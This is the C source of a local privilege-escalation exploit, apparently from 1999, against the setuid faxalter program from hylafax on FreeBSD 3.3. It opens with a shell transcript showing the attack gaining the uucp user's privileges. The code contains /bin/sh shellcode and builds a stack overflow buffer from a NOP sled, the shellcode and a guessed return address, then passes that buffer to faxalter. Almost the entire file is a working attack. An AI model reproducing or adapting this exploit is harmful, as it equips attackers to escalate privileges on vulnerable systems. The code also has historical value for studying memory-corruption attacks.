/* EXPLOIT
bash-2.03$ uname -a; ls -la `which faxalter`; id
FreeBSD  3.3-RELEASE FreeBSD 3.3-RELEASE #0: Thu Sep 16 23:40:35 GMT
1999
         jkh@highwing.cdrom.com:/usr/src/sys/compile/GENERIC  i386
-r-sr-xr-x  1 uucp  bin  72332 Sep 11 03:32 /usr/local/bin/faxalter
uid=1000(xnec) gid=1000(xnec) groups=1000(xnec), 0(wheel)
bash-2.03$ /home/xnec/faxalterx
$ id
uid=1000(xnec) euid=66(uucp) gid=1000(xnec) groups=1000(xnec), 0(wheel)
$
*/

/*
 * Faxalter exploit for FreeBSD 3.3/hylafax-4.0.2 yields euid=66(uucp)
 * Brock Tellier btellier@usa.net
 */

#include <stdio.h>

char shell[]= /* mudge@lopht.com */
   "\xeb\x35\x5e\x59\x33\xc0\x89\x46\xf5\x83\xc8\x07\x66\x89\x46\xf9"
   "\x8d\x1e\x89\x5e\x0b\x33\xd2\x52\x89\x56\x07\x89\x56\x0f\x8d\x46"
   "\x0b\x50\x8d\x06\x50\xb8\x7b\x56\x34\x12\x35\x40\x56\x34\x12\x51"
   "\x9a>:)(:<\xe8\xc6\xff\xff\xff/bin/sh";


main (int argc, char *argv[] ) {
 int x = 0;
 int y = 0;
 int offset = 0;
 int bsize = 4093; /* overflowed buf's bytes + 4(ebp) + 4(eip) + 1 */
 char buf[bsize];
 int eip = 0xbfbfcfad;

 if (argv[1]) {
   offset = atoi(argv[1]);
   eip = eip + offset;
 }
 fprintf(stderr, "eip=0x%x offset=%d buflen=%d\n", eip, offset, bsize);

 for ( x = 0; x < 4021; x++) buf[x] = 0x90;
     fprintf(stderr, "NOPs to %d\n", x);

 for ( y = 0; y < 67 ; x++, y++) buf[x] = shell[y];
     fprintf(stderr, "Shellcode to %d\n",x);

  buf[x++] = eip & 0x000000ff;
  buf[x++] = (eip & 0x0000ff00) >> 8;
  buf[x++] = (eip & 0x00ff0000) >> 16;
  buf[x++] = (eip & 0xff000000) >> 24;
     fprintf(stderr, "eip to %d\n",x);

 buf[bsize - 1]='\0';

 execl("/usr/local/bin/faxalter", "faxalter", "-m", buf, NULL);

}
